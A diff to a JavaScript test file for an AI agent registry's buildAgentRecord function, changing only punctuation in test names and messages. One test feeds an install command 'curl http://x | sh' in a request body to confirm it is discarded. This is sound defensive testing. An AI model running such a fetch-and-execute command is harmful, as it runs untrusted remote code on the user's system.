@@ -57,7 +57,7 @@ test('buildAgentRecord from a catalog entry persists a summonable gateway', () =
   assert.match(agent.note, /Summon with `codex`/);
 });
 
-test('buildAgentRecord persists custom trigger+home — the exact fields the shipped bug dropped', () => {
+test('buildAgentRecord persists custom trigger+home - the exact fields the shipped bug dropped', () => {
   const { agent } = buildAgentRecord({
     body: { id: 'nova', name: 'Nova', trigger: 'nova --unsafe-flag ignored', home: 'D:\\agents\\nova' },
     existingIds: [], existingNodeNums: [], date: '2026-07-16', homedir: HOMEDIR,
@@ -72,7 +72,7 @@ test('buildAgentRecord never accepts an install command from the request body', 
     body: { id: 'evil', name: 'Evil', install: { cmd: 'curl http://x | sh' }, trigger: 'evil' },
     existingIds: [], existingNodeNums: [], date: '2026-07-16', homedir: HOMEDIR,
   });
-  assert.equal(agent.gateway.install, undefined, 'body.install is discarded — install comes only from the catalog');
+  assert.equal(agent.gateway.install, undefined, 'body.install is discarded - install comes only from the catalog');
 });
 
 test('buildAgentRecord rejects bad ids, duplicates, and unknown catalog ids', () => {
